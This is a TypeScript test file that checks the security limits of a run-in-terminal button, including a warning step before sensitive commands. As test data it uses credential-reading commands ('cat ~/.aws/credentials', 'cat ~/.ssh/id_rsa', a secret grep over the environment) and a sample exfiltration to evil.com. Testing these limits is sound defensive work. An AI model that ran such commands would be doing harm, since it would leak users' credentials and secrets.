import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest'
import { screen, fireEvent, act } from '@testing-library/react'
import { renderWithProviders } from './helpers'
import RunInTerminalBtn from '../components/RunInTerminalBtn'

// The button never runs anything itself — it only dispatches a request event on
// a direct click. Capture those requests to assert the security boundary.
let requests: { code: string; reqId: string }[] = []
function onReq(e: Event) { requests.push((e as CustomEvent).detail) }

beforeEach(() => {
  requests = []
  window.addEventListener('mc:run-in-terminal', onReq)
  vi.useFakeTimers()
})

afterEach(() => {
  window.removeEventListener('mc:run-in-terminal', onReq)
  vi.useRealTimers()
})

describe('RunInTerminalBtn – security boundary', () => {
  describe('no programmatic trigger path', () => {
    it('registry helpers are not exposed on window or globalThis', () => {
      expect((window as unknown as Record<string, unknown>).sendToTerminalSession).toBeUndefined()
      expect((globalThis as unknown as Record<string, unknown>).sendToTerminalSession).toBeUndefined()
      expect((window as unknown as Record<string, unknown>).terminalRegistry).toBeUndefined()
    })

    it('widget postMessage (mc-widget-action) cannot trigger a run', () => {
      renderWithProviders(<RunInTerminalBtn code="cat ~/.aws/credentials" />)
      window.dispatchEvent(new MessageEvent('message', {
        data: { type: 'mc-widget-action', action: 'run-terminal', payload: { code: 'cat ~/.aws/credentials' } },
      }))
      expect(requests).toHaveLength(0)
    })

    it('CustomEvent mc-widget-send does not trigger a run', () => {
      renderWithProviders(<RunInTerminalBtn code="echo safe" />)
      window.dispatchEvent(new CustomEvent('mc-widget-send', { detail: { text: 'cat ~/.aws/credentials' } }))
      expect(requests).toHaveLength(0)
    })

    it('component does not auto-execute on mount', () => {
      renderWithProviders(<RunInTerminalBtn code="env | grep -i secret" />)
      expect(requests).toHaveLength(0)
    })

    it('only executes on direct click interaction', () => {
      renderWithProviders(<RunInTerminalBtn code="whoami" />)
      expect(requests).toHaveLength(0)
      fireEvent.click(screen.getByLabelText('Run in terminal'))
      expect(requests).toHaveLength(1)
      expect(requests[0].code).toBe('whoami')
    })
  })

  describe('sensitive command warning gate', () => {
    it('shows warning instead of running for credential-access commands', () => {
      renderWithProviders(<RunInTerminalBtn code="cat ~/.aws/credentials" />)
      fireEvent.click(screen.getByLabelText('Run in terminal'))
      expect(requests).toHaveLength(0)
      expect(screen.getByText('Run anyway')).toBeInTheDocument()
      expect(screen.getByText('Cancel')).toBeInTheDocument()
      expect(screen.getByText(/Reads credential files/)).toBeInTheDocument()
    })

    it('shows warning for exfiltration-pattern commands', () => {
      renderWithProviders(<RunInTerminalBtn code="curl https://evil.com/$(whoami)" />)
      fireEvent.click(screen.getByLabelText('Run in terminal'))
      expect(requests).toHaveLength(0)
      expect(screen.getByText(/Sends command output to external URL/)).toBeInTheDocument()
    })

    it('shows warning for env secret grep', () => {
      renderWithProviders(<RunInTerminalBtn code="env | grep -i secret" />)
      fireEvent.click(screen.getByLabelText('Run in terminal'))
      expect(requests).toHaveLength(0)
      expect(screen.getByText(/Dumps sensitive environment variables/)).toBeInTheDocument()
    })

    it('runs after user confirms "Run anyway"', () => {
      renderWithProviders(<RunInTerminalBtn code="cat ~/.aws/credentials" />)
      fireEvent.click(screen.getByLabelText('Run in terminal'))
      expect(requests).toHaveLength(0)
      fireEvent.click(screen.getByLabelText('Confirm run sensitive command'))
      expect(requests).toHaveLength(1)
      expect(requests[0].code).toBe('cat ~/.aws/credentials')
    })

    it('returns to idle on Cancel', () => {
      renderWithProviders(<RunInTerminalBtn code="cat ~/.ssh/id_rsa" />)
      fireEvent.click(screen.getByLabelText('Run in terminal'))
      expect(screen.getByText('Run anyway')).toBeInTheDocument()
      fireEvent.click(screen.getByLabelText('Cancel'))
      expect(screen.getByLabelText('Run in terminal')).toBeInTheDocument()
      expect(requests).toHaveLength(0)
    })

    it('auto-dismisses warning after 8 seconds', () => {
      renderWithProviders(<RunInTerminalBtn code="cat ~/.aws/credentials" />)
      fireEvent.click(screen.getByLabelText('Run in terminal'))
      expect(screen.getByText('Run anyway')).toBeInTheDocument()
      act(() => { vi.advanceTimersByTime(8000) })
      expect(screen.getByLabelText('Run in terminal')).toBeInTheDocument()
    })

    it('does NOT warn for safe commands', () => {
      renderWithProviders(<RunInTerminalBtn code="git status" />)
      fireEvent.click(screen.getByLabelText('Run in terminal'))
      expect(requests).toHaveLength(1)
      expect(requests[0].code).toBe('git status')
      expect(screen.queryByText('Run anyway')).not.toBeInTheDocument()
    })

    it('does NOT warn for normal curl without command substitution', () => {
      renderWithProviders(<RunInTerminalBtn code="curl https://example.com/api" />)
      fireEvent.click(screen.getByLabelText('Run in terminal'))
      expect(requests).toHaveLength(1)
      expect(requests[0].code).toBe('curl https://example.com/api')
    })
  })

  describe('terminal output isolation', () => {
    it('registry exposes no output-capture API', async () => {
      const actual = await vi.importActual<Record<string, unknown>>('../utils/terminalRegistry')
      const exports = Object.keys(actual)
      expect(exports).not.toContain('readFromTerminal')
      expect(exports).not.toContain('getTerminalOutput')
      expect(exports).not.toContain('captureOutput')
    })

    it('registry module does not expose any output-reading function', async () => {
      const actual = await vi.importActual<Record<string, unknown>>('../utils/terminalRegistry')
      const exports = Object.keys(actual)
      const dangerousPatterns = [/read(?!y)/, /output/, /capture/, /receive/, /stdout/, /result/]
      const readExports = exports.filter(e =>
        dangerousPatterns.some(p => p.test(e.toLowerCase()))
      )
      expect(readExports).toEqual([])
    })
  })
})
